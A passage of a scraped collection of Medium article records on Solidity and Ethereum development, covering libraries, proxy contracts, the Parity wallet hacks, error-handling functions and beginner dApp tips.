to a function, only that in this case the library may have been deployed by someone else and lives on the blockchain.Also, one piece of syntax sugar that makes for easily understandable code is using using. Using this keyword, a function in the library can be called as a method of its first parameter, making it look like it is a proper method.The using keyword allows for calling functions in CounterLib for all functions that take a Counter as a first argument, as if they were a method of the struct.This construct is pretty similar of how you can execute methods on Go structs, without them being fully-fledged objects.Events and librariesIn the same way that libraries don\u2019t have storage, they don\u2019t have an event log. But they can dispatch events, let me explain that:As stated above, a library can be thought of as an implicit base contract, and in the same way that if a explicit base contract dispatches an event it will appear in the main contract event log, same thing happens with libraries, they will be saved in the event log of the contract that calls the event emitting function in the library.Only problem is, as of right now, the contract ABI does not reflect the events that the libraries it uses may emit. This confuses clients such as web3, that won\u2019t be able to decode what event was called or figure out how to decode its arguments.There is a quick hack for this, defining the event both in the contract and the library will trick clients into thinking that it was actually the main contract who sent the event and not the library.Here is a small example illustrating this, even though the Emit event is emitted by the library, by listening on EventEmitterContract.Emit we will be able to get the events. In contrast, listening on EventEmitterLib.Emit will never get any events.Implementing ERC20LibAs a real world example on developing with libraries, I\u2019m going to refactor Zeppelin\u2019s ERC20 StandardToken to be built using libraries.The first step will be to rewrite SafeMath to be a library, as because of its current design to be used as a base contract won\u2019t work, because libraries aren\u2019t allowed to inherit. Also this refactor will make using SafeMath more clear: (safeMul(2, 3) vs 2.times(3) )https://github.com/AragonOne/zeppelin-solidity/blob/master/contracts/SafeMathLib.solEven though libraries cannot directly inherit, they can be linked with other libraries and use them in the same way a contract would, but with the natural limitations of libraries.Now for the real work, ERC20Lib is be the library that contains all the business logic related to managing a ERC20 token. It defines the TokenStorage struct which holds all the storage a token needs, and all its functions.https://github.com/AragonOne/zeppelin-solidity/blob/master/contracts/token/ERC20Lib.solNow that all the required logic is encapsulated in the library, implementing StandardToken is trivial and will only contain code specific to that token and accessor functions that directly call methods on the library using TokenStorage (and the event declaration as we explained above).https://github.com/AragonOne/zeppelin-solidity/blob/master/contracts/token/StandardToken.solThe interesting part of this approach is that both ERC20Lib and SafeMathLib only need to be deployed once and all the contracts that link ERC20Lib will be using the same, secure, audited code.The full refactor is in Aragon\u2019s Zeppelin fork, and all the tests related to StandardToken are still passing even thought its internal architecture is fundamentally changed.Wrapping upAs we the first lines of the article said, Solidity has still a long way to go in terms of programmer productivity and language expressiveness. In my opinion, libraries are a very good way to achieve code reusability.For us at Aragon, developing with libraries is very important as we plan to deploy many times the same code with slight modifications or none at all. Using this architecture will allow our clients to save in transaction fees and also have a proof that the software their company is running is the same one that powers other successful organizations.", "responses": "12"}, {"title": "The ultimate guide to audit a Smart Contract + Most dangerous attacks in\u00a0Solidity", "author_name": "Merunas Grincalaitis", "link": "https://medium.com/ethereum-developers/how-to-audit-a-smart-contract-most-dangerous-attacks-in-solidity-ae402a7e7868?source=search_post---------9", "post_date": "Sep 17, 2017", "readtime": "12 min read", "upvotes": "1.6K", "content": "The ultimate guide to audit a Smart Contract + Most dangerous attacks in\u00a0SolidityMerunas GrincalaitisBlockedUnblockFollowFollowingSep 17, 2017Have you ever wondered how to audit a Smart Contract to find security breaches?You can learn it by yourself or you can use this handy step-by-step guide to know exactly what to do at what moment and audit those contract.I\u2019ve been researching several Smart Contract audits and I\u2019ve learn the most common steps they took to extract all the essential information from any contract.You\u2019ll learn the following:Steps to take in order to fully audit a Smart Contract to generate a pdf with all the findings.The most important types of attacks that you need to know as an Ethereum Smart Contract Auditor.What to look for in a contract and useful tips that you won\u2019t find anywhere else but here.Let\u2019s get right to it and start auditing contracts:", "responses": "9"}, {"title": "Proxy Libraries in\u00a0Solidity", "author_name": "Manuel Araoz", "link": "https://blog.zeppelin.solutions/proxy-libraries-in-solidity-79fbe4b970fd?source=search_post", "post_date": "Mar 6, 2017", "readtime": "3 min read", "upvotes": "1.1K", "content": "Proxy Libraries in\u00a0SolidityThis is a joint post by Zeppelin Solutions and\u00a0Aragon.Manuel AraozBlockedUnblockFollowFollowingMar 6, 2017We recently read some articles about neat tricks and hacks one can do in Solidity. Specifically, Jorge Izquierdo\u2019s article on Library Driven Development and Simon de la Rouviere\u2019s article on ThrowProxy.That got us thinking about using those ideas to turn Zeppelin into an upgradeable blockchain-deployed library. Currently, Zeppelin is a collection of secure and community-vetted contracts for anyone to use. This is work towards creating security standards and industry best practices. But in order to use them, developers have to download our code and deploy parallel copies of it alongside their application-specific contracts.This has several disadvantages:Deployment gas costs.Code repetition in the blockchain.Bug fixes and updates need to be deployed independently on each project (or, even worse, Ethereum has to hard fork to fix a contract\u2019s problems).What if we could have a deployed version of a library in the blockchain, which all projects using Zeppelin could link directly? That\u2019s the idea behind Solidity\u2019s libraries. The problem is, once a library code is deployed, it\u2019s immutable. For Zeppelin, being able to fix security vulnerabilities and add more reusable modules is key for our users. Thus, we\u2019d need some mechanism to upgrade the contract\u2019s code.Some attempts to do this are Martin Swende\u2019s generic proxy and Arachnid\u2019s upgradeable contract, but have their drawbacks and can\u2019t be used for libraries.Our idea: Use a normal contract, but call it as a library (use delegatecall instead of call)Result: It works!Proposed implementationCode: https://github.com/maraoz/solidity-proxy/blob/master/test/test.es6maraoz/solidity-proxysolidity-proxy - Solidity implementation of a delegate proxygithub.comCheck it out and please give us feedback! We\u2019ll be evaluating how to use this new technique to turn Zeppelin into a deployed upgradable library in the next few weeks.On a more technical level, our solution flow looks like this:Instead of linking the main, user facing contract directly with the address of the deployed library, it is linked to a \u2018Dispatcher\u2019. At compile and deploy time this is just fine, even though the Dispatcher doesn\u2019t implement any of the methods of the library, if the bytecode has a valid address the deploy will be successful.When a transaction comes in, the main contract thinks it is making a delegatecall to the library it is linked with. But this delegatecall will instead be made to the dispatcher.Here is where things get interesting. Once the dispatcher catches the delegatecall in its fallback function it figures out what the correct version of the library code is, and redirects the call once again with a delegatecall. Once the library returns, the return will go all the way back to the main contract.LimitationsThe dispatcher needs to know what the memory size for the return of that library call is. Right now we solved it by having a mapping for function signatures to their return type size. This was intentionally kept out of the drawing for the sake of simplicity.Given the way delegatecall\u2019s work on the EVM level, you can only use it from one contract to another that have the same storage footprint. As libraries have no storage, we kept Dispatcher with no storage. That\u2019s why a separate DispatcherStorage to keep all the data it needs. Also, the address of the DispatcherStorage needs to be hardcoded in the contract bytecode.Note that for the user contract nothing special is needed, only that instead of being linked with the concrete version of the library, it has to be linked with the dispatcher.Future workAllow data migration of user contracts when library is upgraded (data structures may change). Golem\u2019s GTN Token has a migration mechanism that could serve as inspiration.Storage layout sanity checks in the proxy.Arbitrary code execution on contracts for emergencies.We\u2019ll be writing about these topics in the following weeks.Thanks Christian Reitwiessner for reviewing and commenting on early drafts.Be part of the communityContinue the discussion on our forumJoin our Telegram groupFollow us on TwitterEven better, join the team \ud83d\ude80", "responses": "16"}, {"title": "Turing Incompleteness and the Sad State of\u00a0Solidity", "author_name": "Stuart Farmer", "link": "https://blog.lamden.io/turing-incompleteness-and-the-sad-state-of-solidity-d5278ba4eda0?source=search_post", "post_date": "Nov 8, 2017", "readtime": "5 min read", "upvotes": "1.2K", "content": "Turing Incompleteness and the Sad State of\u00a0SolidityStuart FarmerBlockedUnblockFollowFollowingNov 8, 2017Update: the grand total is around $280,000,000 of frozen assets. AKA: 600% of the DAO hack, and 1000% of the 1st parity hack.Update 2: We are now creating our own Turing Incomplete variation of the Python language called Seneca that will be used for Smart Contracts on our blockchain, Cilantro.So Parity\u2019s and Ethereum\u2019s founder Gavin Wood lost all of his money from his new ICO venture Polkadot that is supposed to revolutionize and connect blockchains together with some strange paradigms of \u2018fishermen\u2019 because he can\u2019t seem to implement one of the most basic smart contracts on Earth.Fact: A system\u2019s worth is determined by how complex and convoluted it is, the number of pretty graphics in the whitepaper, and the quirkiness of the metaphors used to describe the concepts within. See the Plasma whitepaper for more information.Back in July, some hacker drained a ton of multisig wallet contracts because the developers (lead by Gavin) left a single modifying variable out of a function which allowed the public to essentially steal control on any multisig wallet they wanted.Someone forgot to add the word \u2018internal\u2019 to this function, and that\u2019s what caused the 1st Parity hack of $30,000,000 to\u00a0occur.That hack drained about $30,000,000. Parity pushed out a major release and had a way to turn your old multisig wallets into new multisig wallets. All fine and dandy.Gavin Wood after the 1st hack when none of the money that was stolen was his\u00a0(/s)And then some random kid poking smart contracts online to learn about Ethereum accidentally sent a kill command to the library contract that all of these new multisig wallet contracts were based off, rendering all of these new contracts unusable.At least he opened a GitHub issue letting the devs know that anyone could kill their smart contract.Thus, whoever had money inside of those NEW multisig wallets that were supposed to have gone through a new wave of security checks now had their funds frozen. That included Gavin himself and experts are saying the number of funds that have been frozen in wallets is around $150,000,000 to $200,000,000.Gavin after being told that all of his ICO funds were frozen\u00a0(/s)Remember when the DAO happened? It was a mess because instead of letting the system ride out and trying to fix the security problem of having a Turing complete virtual machine on a blockchain, the key developers decided to just hard fork the ledger, give everyone\u2019s money back (some of which was Vitalik\u2019s) and continue on.This makes the system no different than a PayPal or a credit card company where the managers can revert payments from people who steal your card info.The DAO hack was an estimated $50,000,000. That would make this new Parity hack at least 3 times more severe. Four times if you take into account the previous hack as well. Will the core developers fork Ethereum again? It\u2019s unknown. They\u2019ve done it before and Gavin has a lot of pull in the community.Why do these hacks keep happening?In computer science, there\u2019s a concept of a Turing complete machine. A Turing complete machine is able to do everything that a modern computer can do from a mathematical standpoint. This is powerful because that means you can do a lot with it, especially when it is paired with a blockchain and a programming language.What it also does, unfortunately, is introduce an infinite and unknown amount of attack vectors, which are potential ways that the system can be hacked. Combine this with a team of developers who fail to implement a robust set of test suites to make sure that the known attack vectors are handled and you get the ridiculous meltdown we are currently witnessing.Something you should also know is that while you can\u2019t prevent bad programmers from programming bad code, Ethereum has a duty to produce their smart contracting language in a way that mitigates these sorts of potential attack vectors. That would be great if there were people actually working on the core development of Solidity.Solidity development itself has 2 people working on it full time. The market cap of Ethereum is over $25,000,000,000. Two people are working on the smart contracting system for a multi-billion dollar system that has unknown levels of attack vectors.A graph of who\u2019s working on Solidity. Right now, only two core developers for a system that has billions of dollars behind it. Gavin stopped contributing over a year ago (source: https://github.com/ethereum/solidity/graphs/contributors).Hey, but maybe two developers is all you need, right? Clearly not. You still have unknown and unseen attacks occurring in the system every single day and you still can\u2019t define a float (aka a decimal number such as 0.1337) in Solidity. Yeah, let that sink it. The community says this is because of the floating-point problem, but another smart contracting language called Pact has already figured out a solution and they don\u2019t have billions of dollars worth of users behind them.Turing IncompletenessFor complicated applications that run on independent computers, Turing completeness works great. If the system crashes, you just have to reboot it. Because these systems are generally private, you can create permissioning and swath off huge potential attack points and limit how people use your app.In blockchain, everything is public. The original Turing complete systems don\u2019t really work well when you have everyone smashing everything all over the place. When a newbie programmer can trip over a wire and cause a $150,000,000 crash, you know something is wrong.That\u2019s why Turing incompleteness is the way in which we need to go. Not only is it safer, but the types of applications we\u2019ve seen on the Ethereum blockchain thus far do not require Turing completeness and it has only done more damage than good. Most contracts right now are for crowdfunding and moving assets. Why are we supporting a system that does so much more?Let\u2019s permission ourselves out of the system and only allow very specific operations to occur. It may not be a \u2018true computer\u2019 but that doesn\u2019t matter. We just want to be able to do certain things on the blockchain and in public.This new paradigm is being explored right now with the Pact smart contracting system which I urge you all to check out, and we will be using these lessons as we develop Seneca, Lamden\u2019s own smart contracting language.In terms of Turing incompleteness and Lamden, the Lamden Tau token from our token sale will be deployed on a delegated proof-of-stake blockchain system featuring this Turing incomplete smart contracting language.", "responses": "6"}, {"title": "The use of revert(), assert(), and require() in Solidity, and the new REVERT opcode in the\u00a0EVM", "author_name": "Maurelian", "link": "https://media.consensys.net/when-to-use-revert-assert-and-require-in-solidity-61fb2c0e5a57?source=search_post", "post_date": "Sep 19, 2017", "readtime": "6 min read", "upvotes": "955", "content": "The use of revert(), assert(), and require() in Solidity, and the new REVERT opcode in the\u00a0EVMMaurelianBlockedUnblockFollowFollowingSep 19, 2017Photo by Osman\u00a0RanaThe release of Solidity version 0.4.10 introduced the assert(), require() and revert() functions, and confusion has reigned ever since.In particular, the assert() and require() \u201cguard\u201d functions improve the readability of contract code, but differentiating between them can be quite confounding.In this article, I\u2019ll:explain the problem these functions solve.discuss how the Solidity compiler handles the new assert(), require() and revert().Give some rules of thumb for deciding how and when to use each one.For convenience, I\u2019ve created a simple contract using each of these features which you can test out in remix.If you really just want a TLDR, this answer on the ethereum stackexchange should do it.Patterns for error handling in\u00a0SolidityThe old way: throw and the if\u00a0\u2026 throw\u00a0patternSay your contract has a few special functions, that should only be callable by a particular address which is designated as the owner.Prior to Solidity 0.4.10 (and for a while afterwards), this was a common pattern for enforcing permissions:contract HasAnOwner {    address owner;        function useSuperPowers(){         if (msg.sender != owner) { throw; }        // do something only the owner should be allowed to do    }}If the useSuperPowers() function is called by anyone other than owner, the function will throw returning an invalid opcode error, undoing all state changes, and using up all remaining gas (see this article for more on gas and fees in ethereum).The throw keyword is now being deprecated, and eventually will be removed altogether. Fortunately, the new functions assert(), require(), and revert() provide the same functionality, with a much cleaner syntax.Life after\u00a0throwLet\u2019s look at how to update that if\u00a0.. throw pattern with our new guard functions.This line:if(msg.sender\u00a0!= owner) { throw; }currently behaves exactly the same as all of the following:if(msg.sender\u00a0!= owner) { revert(); }assert(msg.sender == owner);require(msg.sender == owner);Note that in the assert() and require() examples, the conditional statement is an inversion of the if block\u2019s condition, switching the comparison operator\u00a0!= to ==.Differentiating between assert() and require()First, to help separate these \u2018guard\u2019 functions in your mind, imagine assert() as an overly assertive bully, who steals all your gas. Then imagine require() as a polite managerial type, who calls out your errors, but is more forgiving.With that mnemonic handy, what\u2019s the real difference between these two functions?Prior to the Byzantium network upgrade, require() and assert() actually behave identically, but their bytecode output is slightly different.assert() uses the 0xfe opcode to cause an error conditionrequire() uses the 0xfd opcode to cause an error conditionIf you look up either of those opcodes in the yellow paper, you won\u2019t find them. This is why you see the invalid opcode error, because there\u2019s no specification for how a client should handle them.That will change however after Byzantium, and the implemention of EIP-140: REVERT instruction in the Ethereum Virtual Machine\u00a0. Then the0xfd opcode will be mapped to theREVERT instruction.This is what I find really fascinating:Many contracts have been deployed since version 0.4.10, which include a new opcode lying dormant, until it\u2019s no longer invalid. At the appointed time, it will wake up, and become REVERT!Note: throw andrevert() also use 0xfd. Prior to 0.4.10. throw used 0xfe.What the REVERT opcode will\u00a0doREVERT will still undo all state changes, but it will be handled differently than an \u201cinvalid opcode\u201d in two ways:It will allow you to return a value.It will refund any remaining gas to the caller.1. It will allow you to return a\u00a0valueMost smart contract developers are quite familiar with the notoriously unhelpful invalid opcode error. Fortunately, we\u2019ll soon be able to return an error message, or a number corresponding to an error type.That will look something like this:revert(\u2018Something bad happened\u2019);orrequire(condition, \u2018Something bad happened\u2019);Note: solidity doesn\u2019t support this return value argument yet, but you can watch this issue for that update.2. Refund the remaining gas to the\u00a0callerCurrently, when your contract throws it uses up any remaining gas. This can result in a very generous donation to miners, and often ends up costing users a lot of money.Once REVERT is implemented in the EVM, it will be plain old bad manners not to use it to refund the excess gas.Choosing between revert(), assert() and require()So, ifrevert() and require() both refund any left over gas, AND allow you to return a value, why would want to burn up gas using assert()?The difference lies in the bytecode output, and for this I\u2019ll quote from the docs (emphasis mine):The require function should be used to ensure valid conditions, such as inputs, or contract state variables are met, or to validate return values from calls to external contracts. If used properly, analysis tools can evaluate your contract to identify the conditions and function calls which will reach a failing assert. Properly functioning code should never reach a failing assert statement; if this happens there is a bug in your contract which you should fix.To clarify that somewhat: it should be considered a normal and healthy occurrence for a require() statement to fail (same with revert()). When an assert() statement fails, something very wrong and unexpected has happened, and you need to fix your code.By following this guidance, static analysis and formal verification tools will be able to examine your contracts to find and prove the conditions which could break your contract, or to prove that your contract operates as designed without flaws.In practice, I use a few heuristics to help me decide which is appropriate.Use require()to:Validate user inputs ie. require(input<20);Validate the response from an external contract ie. require(external.send(amount));Validate state conditions prior to execution, ie. require(block.number > SOME_BLOCK_NUMBER) or require(balance[msg.sender]>=amount)Generally, you should use require most oftenGenerally, it will be used towards the beginning of a functionThere are many examples of require() in use for such things in our Smart Contract Best Practices.Use revert()to:Handle the same type of situations as require(), but with more complex logic.If you have some complex nested if/else logic flow, you may find that it makes sense to use revert() instead of require(). Keep in mind though, complex logic is a code smell.Use assert() to:Check for overflow/underflow, ie. c = a+b; assert(c > b)Check invariants, ie. assert(this.balance >= totalSupply);Validate state after making changesPrevent conditions which should never, ever be possibleGenerally, you will probably use assert less oftenGenerally, it will be used towards the end of a function.Basically, require() should be your go to function for checking conditions, assert() is just there to prevent anything really bad from happening, but it shouldn\u2019t be possible for the condition to evaluate to false.Also: \u201cyou should not use assert blindly for overflow checking but only if you think that previous checks (either using ifor require) would make an overflow impossible\u201d.\u200a\u2014\u200acomment from @chrisethConclusionThese functions are very powerful tools for your security toolbox. Knowing how and when to use them will not only help prevent vulnerabilities, but also make your code more user friendly, and future proof against upcoming changes.", "responses": "10"}, {"title": "Here are the best courses and resources for learning Solidity (Ethereum dApps)", "author_name": "Indrek Lasn", "link": "https://medium.freecodecamp.org/here-are-the-best-courses-and-resources-for-learning-solidity-ethereum-dapps-600e18287381?source=search_post", "post_date": "Jun 4, 2018", "readtime": "4 min read", "upvotes": "1K", "content": "Here are the best courses and resources for learning Solidity (Ethereum dApps)Indrek LasnBlockedUnblockFollowFollowingJun 4, 2018Solidity learning resources are not that well-known. Here\u2019s a useful list for learning solidity and Ethereum development.First of all\u200a\u2014\u200awhat is solidity?\u201cSolidity is a contract-oriented, high-level language for implementing smart contracts. It was influenced by C++, Python and JavaScript. It is designed to target the Ethereum Virtual Machine\u00a0(EVM).\u201dSecondly\u200a\u2014\u200awhat is Ethereum?In a nutshell, Ethereum is a blockchain-based distributed ledger which keeps track of all the states/transactions. A single entity (computer) is called a node. All nodes combined creates the Ethereum network. Think of Ethereum as this \u201csuper-computer\u201d and solidity a way to give instructions to the \u201csuper-computer\u201d.But why is this even a\u00a0thing?Now, that\u2019s an excellent question. Ethereum is an interesting concept. Why?Ethereum allows us to build decentralized apps (dApps). Here are a couple dApp use cases top of my head:No one has the right to censor you nor delete your comments on the free web. Freedom of speech. It\u2019s especially important for modern media platforms. (Transparency)Cryptocurrencies/tokens. You have the full rights to your assets and no one has the privilege of freezing your accounts. Transferring cryptocurrencies only requires the raw computing power to compute the transaction.Check out this introduction if you need more info.So how do you get started building Dapps? Great question. I gathered a list to help you kickstart developing dApps with Solidity and Ethereum.Ethereum and Solidity: The Complete Developer\u2019s GuideYou will learn the following:How to design, test, and deploy secure Smart Contracts.Why engineers would want to create an app with Ethereum.How to use the latest version of Ethereum development tools (Web3 v1.0)Ethereum Smart ContractsThe following things you will learn from this course are:State, Functions, Modifiers and EventsPayable functionsInheritanceContract To Contract CommunicationLibrariesSmart Contracts and Decentralized Apps\u00a0101This course grants eye-opening experience in the following fields:Solidity and Ethereum basics (101).Interact with smart contracts from a UI. (Thanks to web3.js)cryptozombies.io\u201cCryptoZombies is an interactive code school that teaches you to write smart contracts in Solidity through building your own crypto-collectables game.\u201dDiscover Ethereum &\u00a0SolidityFrom the maker of the course:Many people are excited about the promises of Ethereum and are itching to create a new generation of decentralized applications for the web.However, navigating the Ethereum landscape as a developer can be very confusing, since writing apps for the blockchain requires grasping many new concepts. On top of that, most tutorials are out-of-date or use deprecated tools in a rapidly changing ecosystem, making it hard to even know where to start.That\u2019s why I\u2019ve created this course, where beginners can create a complete DApp from start to finish, using common best practices from the Ethereum ecosystem.By the end of the tutorial, you will have all the skills required to design your own smart contracts in Solidity, hooking them up to a modern web interface, and create your very own token sale to help you successfully kickstart future blockchain projects.Learning SolidityWhat you will learn:From basics to state modifiers.Auditing your code and finding security flaws.Truffle, Testrpc, ERC20 tokens.Capture the Ether\u200a\u2014\u200a(game)Ethereum Smart Contract Security Best Practices \u2014Awesome Solidity\u200a\u2014\u200a(Github repository)One of my favorite curated lists consisting of solidity stuff.ethereumdev.ioDapp UniversityDo you know any excellent high quality solidity courses? Post them below and I\u2019ll make sure to add them here!Thanks for making it to the bottom. If you find this useful\u200a\u2014\u200aplease give me some claps so more people can see it. You can find me on Twitter\u200a\u2014\u200a@lasnindrekIndrek Lasn (@lasnindrek) | TwitterThe latest Tweets from Indrek Lasn (@lasnindrek). Coder, writer, blockchain dev, startup guy. Opinions are my own\u2026twitter.comThe secret to being a top developer is building things! Here\u2019s a list of fun apps to build!You can only become a great developer by putting the effort in. Imagine for a moment\u200a\u2014\u200aYou can\u2019t become fit physically\u2026medium.freecodecamp.orgHow to set-up a powerful API with Nodejs, GraphQL, MongoDB, Hapi, and SwaggerSeparating your frontend and backend has many advantages:medium.freecodecamp.org\u2764", "responses": "6"}, {"title": "The Best Way to Start Coding in\u00a0Solidity", "author_name": "Dave Kajpust", "link": "https://medium.com/@davekaj/solidity-tips-and-tricks-for-beginners-building-their-first-dapp-on-ethereum-fed32d6a19ac?source=search_post", "post_date": "Sep 15, 2017", "readtime": "9 min read", "upvotes": "1K", "content": "The Best Way to Start Coding in\u00a0SolidityDave KajpustBlockedUnblockFollowFollowingSep 15, 2017This post is a list of Solidity tips and tricks I learned the hard way, by going through Solidity on my own and brute forcing my way through learning. This is really the only way to do it right now if you are learning on your own. It will help to identify the easiest tools and tips in order to get your first dApp deployed on the testnet using Heroku.To start coding a new language, you want the easiest development environment that will help you through bugs so you can learn from your mistakes quickly as you go. Start by using the Remix Solidity IDE https://remix.ethereum.org.It is great for debugging, and gives you an option to step through the contract which is extremely helpful. I found it very useful to use the debugger throughout the whole development of my dApp, but at the start it was 100% necessary to help me write code that would actually compile.You should use remix until you get your dApp to compile with no bugs.There are three options with remix for injecting a blockchain instance into the browser, you can use the Javascript Virtual Machine (JVM), an injected web3 instance (like the chrome extension Metamask), or connecting to a web3 provider (like Infura). The JVM is the way to go when you are a beginner. It is much more forgiving, it ignores gas limits, it gives you an unlimited amount of ether to play with between 5 accounts, and it is much faster to debug with.Make sure the environment is JavaScript VM when starting with your first\u00a0dApp.Start using Event Logs as much as possible to debug your code. They are the closest thing to console.log() from Javascript, as they can notify you of any changes to the state variables of your contract. In Remix they automatically show up in the user interface on the right side. When you want to see them from the front end of your dApp you will have to watch for the event with web3.js (explained later on in this post).Events are shown in the right side user interface of\u00a0remix.Note that Remix is glitchy sometimes. If it isn\u2019t doing what you think it should be doing, open and close a new chrome window and it often helps. This is new software that is in active development, so bugs are expected.Note that sometimes the numbers in local or state storage while debugging will be extremely large. This might be due to accidental overflow for an integer calculation. However I have noticed that there is a bug in Remix\u00a0. Sometimes while debugging it will show overflow, but in reality the contract still works and you get the correct results when executing functions in your dApp. So really pay attention when debugging to local and state storage, and if it is showing overflow and your contract still works perfectly, you are probably okay.Using the Solidity Locals and Solidity State variable viewer in the debugger of remix is extremely helpful to see if your functions are working properly.Keep in mind the first dApp you build will be slow when you are calling functions because you have to wait for blocks to be mined to get a response. This won\u2019t rear its ugly head while using the JVM, as everything happens instantaneously. As you move away from the JVM it will be more frustrating to debug, so do as much debugging as you can here.Moving onto a Better Development Environment with Truffle and\u00a0testRPCIt is tempting to keep using Remix, but you should move on once you get to a point where your dApp compiles properly. Next you should use tools such as Truffle and testRPC that help simulate a real blockchain, so you can test your dApp in a more realistic situation.Truffle is a framework for developing and deploying Ethereum dApps. It is the best framework out there right now, and they are constantly upgrading and improving their product.testRPC is a simulated Ethereum blockchain you can run on your local machine that has been tweaked specifically for fast testing. You don\u2019t have to wait anytime between blocks to see how your dApp is responding, which is super helpful for testing and debugging. However it still gives you a real blockchain environment for testing that will fail for things like an out of gas limitation.Truffle lets you write tests for your dApp with Javascript (based on mocha\u2019s framework) and Solidity. Overall I have found that Javascript is better for integration tests, while Solidity is better for unit testing. However, I was unable to find good examples of Solidity testing online, and the documentation on it is not very in depth. Because of this I ended up doing the majority of my testing with Javascript because there is excellent documentation for mocha.It is sometimes tricky to test smart contracts, because there are situations where you want your contract to fail, like if only the owner is supposed to call a function, and if someone else tries to it should fail. The basic framework of truffle isn\u2019t fully adapted to easily test for this at the moment, but there is a good blog post on a workaround that helps with testing for failures.Sometimes testRPC can act weird in the terminal. If you don\u2019t end testRPC properly and you close your terminal window, it could still be running. Then the next time you try to run testRPC it won\u2019t allow you to start a new instance. This happened most frequently to me when I used MetaMask. For some reason you can\u2019t crtl+C out of testRPC when it is connect to MetaMask, so I started doing crtl+Z, and then I ran into these problems. I found resetting my computer cleans this up, and any other issues I came across with testRPC.Turning it into a Real Front End dApp with Truffle\u00a0BoxesTruffle Boxes is a combination of the Truffle Framework and the React Framework. In order to use truffle boxes, you\u2019ll need a basic understanding of react to go forward.Build out the most basic version of your front end dApp to interact with your contract. It will end up being almost exactly like a normal React app, but you use web3 js (which comes included in Truffle) to interact with the blockchain. You will then have to inject a blockchain instance into your chrome browser so that you can interact with your testRPC on the testnet.MetaMask is the easiest way to interact with a blockchain in the browser. It is a chrome extension that allows you to inject the mainnet, the testnet, or a local instance (like testRPC) of a blockchain. It also allows you to use multiple accounts and send ether or testnet ether between them. Then the web3 code in your front end will interact with the blockchain injected from MetaMask, and you have connected your dApp to a real blockchain!Metamask Chrome Extension interface\u200a\u2014\u200aunfortunately that is testnet ether, which is worthless\u00a0:(.Note that in a developement environemnt with metamask, you should never store real ether alongside your testnet ether, just in case you make a mistake, and send real ether while testing.You can get test net ether for the rinkeby test net here: https://faucet.rinkeby.io/.Always send transactions with a high gas cost in GWEI on the testnet. You might be inclined to keep it low because you are used to doing so for mainnet transactions. I\u2019ve have long waiting times and bugs that have cost me an hour or two of time because I simply set way too small of a gas price on a large contract deployment, and then it failed on the test net, but MetaMask thought it succeeded. Then I couldn\u2019t do anything because MetaMasks nonce count was incorrect. Testnet ether is worthless so you might as well send a lot to beat everyone else in the line!Use the mnemonic flag in testRPC to repeatedly get the same accounts generated whenever you start a new testRPC instance. I use the following command in my terminal:The mnemonic flag generates ethereum accounts based on a string you pass it upon starting testRPC. If I always provide \u201chello\u201d, I will always get the same accounts. This makes it easier to hardcode in accounts while running tests. The accounts flag is used to generate 50 addresses, also good for\u00a0testing.Accounts[0] (from truffle and web3) will be the account that MetaMask had opened up when the dApp is loaded in the browser. Sometimes MetaMask is finicky, and if you switch back and forth between accounts the dApp\u2019s web3 and Metamasks accounts won\u2019t be talking to each other correctly. Just refresh the page.MetaMask will sometimes let you know a call from your front end dApp to the blockchain is going to fail by maxing out the gas you are sending with the transaction, and sending 0 ether instead of the amount the dApp is asking for. It doesn\u2019t explicitly say why it will fail, but it will, and it will use up all the testnet gas. This happens most often when an account tries to call a function that it does not have access to, and it will just revert and burn the gas.Deployment with\u00a0HerokuHeroku is perfect for deploying your dApp because it is super easy to do, and your dApp doesn\u2019t have a backend which makes Heroku\u2019s simple setup very attractive. This article will help with deploying a dApp on Heroku (you will have to let chrome translate the page to English) https://medium.com/taipei-ethereum-meetup/ethereum-dapp-tutorial-push-button-cae3810086a4.My first version of my first dApp deployed to Heroku was very basic, but it doesn\u2019t have to be pretty as long as the smart contract does what it is supposed to do! You can see it here: https://heroku-patreon.herokuapp.com/ (code is located here).The first version of the first dApp I deployed with\u00a0heroku.When you deploy the front end to Heroku, you will have to deploy your contract to the testnet as well. Deploy the contract first, then once it is deployed you can get the address of the contract from etherscan, and hardcode it into your front end so that your dApp is interacting with the correct contract on the testnet. There are a few ways to deploy a contract to the testnet:You can deploy the contract using remix by injecting a web3 instance with MetaMask (make sure you change the environment from JavaScript VM to web3 instance, and that you pick the correct testnet to deploy to).You can deploy with myetherwallet here: https://www.myetherwallet.com/#contractsYou can deploy with truffle as well, and there are good instructions to do so in their documentation.I found using remix to be the easiest way to deploy a simple dApp.General TipsKeep your first few contracts simple.Always update your dev tools (Truffle, testRPC, MetaMask) as much as possible. This is a new field and new versions of the software come out weekly.Be weary of looking at old Solidity code and copying it directly into yours. Solidity is updated often and some of their functions have been deprecated.Read the Solidity documentation.Learn to deal with ether in wei from the beginning, because all numbers should be passed around in wei on the EVM and the front end. Otherwise you will have to retroactively go back and fix your code, which is frustrating.The first time you come across a Big Number while coding go read the documentation here. It will help immensely when you start passing numbers between your front end and the blockchain.Consistenly check back with the web3 documentation and the truffle documenation. They both have a lot of helpful functions that make building dApps easier. There were multiple times when I tried to do something on my own, only to realize that truffle or web3 already has a function that does what I needed.Things to look into for your second\u00a0dAppOnce you get the hang of actually creating a dApp that works, start to look more into the security of writing good smart contract code. Learn about common pitfalls and bugs and how to prevent them. A great place to start is ConSensys\u2019s smart contract best practices.You can watch for Event Logs from the blockchain with the front end by using using web3 (https://github.com/ethereum/wiki/wiki/JavaScript-API#contract-events). Watching for Event Logs from the front end allows you to automatically update the front end when something is changed on the blockchain.Once you get the hang of smart contracts you can start to look at ways to reduce the gas cost of the deployment of your contract, and lowering gas cost for storage of state variables. When you are working on your first dApp there is no need to worry about this as it will just confuse you more.ConclusionGood luck deploying your first dApp! If you have any questions please ask in the comment section, or tweet at me @davekajpust.", "responses": "8"}, {"title": "Thinking in\u00a0Solidity", "author_name": "Tim Cotten", "link": "https://blog.cotten.io/thinking-in-solidity-6670c06390a9?source=search_post", "post_date": "Jun 4, 2018", "readtime": "20 min read", "upvotes": "949", "content": "Thinking in\u00a0SolidityConverting a Java Implementation of Quicksort to\u00a0SolidityTim CottenBlockedUnblockFollowFollowingJun 4, 2018This article will help you convert a simple Java program to Solidity to solve a simple integer sorting problem, highlighting many of the perils and pitfalls to avoid in optimizing gas usage\u200a\u2014\u200aespecially pre-mature optimization and algorithm validation.On May 23rd, 2018 Ethereum\u2019s Nick Johnson posted the first-ever Solidity Gas Golfing Contest on reddit.Code golf contests are great because they encourage mastery of the intricacies of systems and programming languages in order to create the shortest possible source code to complete a given task. In the case of Ethereum and Solidity, this contest is all about minimizing the gas spent performing operations on the Ethereum Virtual Machine (EVM), rather than the brevity of the code itself.Why is that important? At the time of writing each Ethereum block has an upper 